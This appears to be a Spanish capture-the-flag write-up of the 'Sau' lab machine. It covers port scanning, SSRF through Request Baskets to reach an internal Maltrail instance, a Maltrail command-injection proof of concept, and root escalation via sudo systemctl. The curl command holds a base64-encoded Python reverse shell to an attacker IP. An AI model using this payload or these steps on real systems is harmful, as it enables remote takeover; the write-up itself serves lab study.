----
- Tags: #SSRF #rce #maltrail #gtfobins #port-discovery #seasson2
-------
## Técnicas utilizadas
- Port discovery through SSRF
- Maltrail abuse[Remote Code Execution]
- Systemctl sudo abuse
## Procedimiento

![[Sau.png]]

-------
#### Reconocimiento
Si lanzamos un **nmap** podemos ver los siguientes puertos abiertos:
```ruby
# # Nmap 7.93 scan initiated Sat Jul  8 12:14:22 2023 as: nmap -sCV -p22,55555 -oN Ports 10.129.150.8
Nmap scan report for 10.129.150.8
Host is up (0.13s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa8867d7133d083a8ace9dc4ddf3e1ed (RSA)
|   256 ec2eb105872a0c7db149876495dc8a21 (ECDSA)
|_  256 b30c47fba2f212ccce0b58820e504336 (ED25519)
55555/tcp open  unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sat, 08 Jul 2023 19:10:41 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Sat, 08 Jul 2023 19:10:13 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Sat, 08 Jul 2023 19:10:14 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.93%I=7%D=7/8%Time=64A9B596%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html;\x
SF:20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Sat,\x2008\x20Jul\x202
SF:023\x2019:10:13\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\"/we
SF:b\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x2020
SF:0\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Sat,\x2008\x20Jul\x202
SF:023\x2019:10:14\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,
SF:67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\
SF:x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")
SF:%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r
SF:\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCo
SF:nnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,"H
SF:TTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20ch
SF:arset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Ke
SF:rberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Options:
SF:\x20nosniff\r\nDate:\x20Sat,\x2008\x20Jul\x202023\x2019:10:41\x20GMT\r\
SF:nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20name;\x20the\x20name
SF:\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\-_\\\.\]{1,250}\$\n
SF:")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clos
SF:e\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul  8 12:16:00 2023 -- 1 IP address (1 host up) scanned in 97.35 seconds
```

Un escaneo con **whatweb** sobre la pagina web, nos muestra las siguientes tecnologías corriendo por detrás:
```ruby
# whatweb 10.129.150.8:55555/web
http://10.129.150.8:55555/web [200 OK] Bootstrap[3.3.7], Country[RESERVED][ZZ], HTML5, IP[10.129.150.8], JQuery[3.2.1], PasswordField, Script, Title[Request Baskets]
```

--------
#### Port discovery through SSRF
En el inicio de la pagina, vemos que hay un tipo de **Generation of baskets**. Podemos crear uno e ir a inspeccionar de que se trata:
![[baskets.png]]

Creamos un nuevo basket y lo abrirmos. Podemos observar que tenemos la capacidad de mandar peticiones a la pagina y esta nos va a almacenar estas como en un **log**:
![[new_request.png]]

Tambien vemos algunos opciones disponibles a la hora de tramitar la petición:
![[basket_options.png]]

Si vamos al apartado con el simbologo de engranaje, podemos configurar algunas cosas interesantes:
![[Pasted image 20230708145018.png]]

Haciendo algunas pruebas, encontramos que la pagina es capaz de ver recursos internos en el servidor. Podemos intentar cargar algún puerto común de los que suelen estar abierto, en este caso intentare con el **80**:
![[port_80.png]]

---------------
#### Maltrail abuse[Remote Code Execution]
Vemos que hay una pagina corriendo internamente. Podemos mandar un curl y almacenar la respuesta en un archivo para ver el codigo fuente:
![[mailtrail.png]]

Se trata de **Maltrail**, en la parte inferior de la pagina viene la versión que esta actualmente en uso:
![[Pasted image 20230708145552.png]]

En **Google** podemos encontrar un PoC que nos muestra como ejecutar codigo remotamente en el servidor de la siguiente manera:
```
# curl -s -X POST "http://10.129.150.8:55555/vnzk6nc" --data 'username=`echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjY3Iiw0NDMpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCJzaCIpJwo=|base64 -d|sh`'
```

Antes de realizar esto, necesitamos apuntar hacia el recurso **Login** que se encuentra en la pagina de **MalTrail**:
![[Pasted image 20230708145821.png]]

Y ahora si podemos ejecutar el RCE. En mi caso, utilizo una **zsh** y por algún motivo no me funciona corretamente, lo que tuve que hacer es ponerme en escucha dos veces, mando la reverse shell y posteriormente doy **Ctrl + C** y me llega la **Reverse Shell** a la otra consola. Quizás en una **bash** este problema no exista:
![[RCE.png]]

-------
#### Systemctl sudo abuse

Si hacemos un **sudo -l** vemos el siguiente privilegio que tenemos a nivel de **Sudoers**:
![[systemctl.png]]

Según [GTFobins](https://gtfobins.github.io/gtfobins/systemctl/#sudo), podemos escalar privilegios sin ejecutarmos el comando y tecleamos `!sh`, de la siguiente manera:
![[sh.png]]

Y ya podemos leer la flag de **root**:
![[79.  Sau/Images/root.png]]

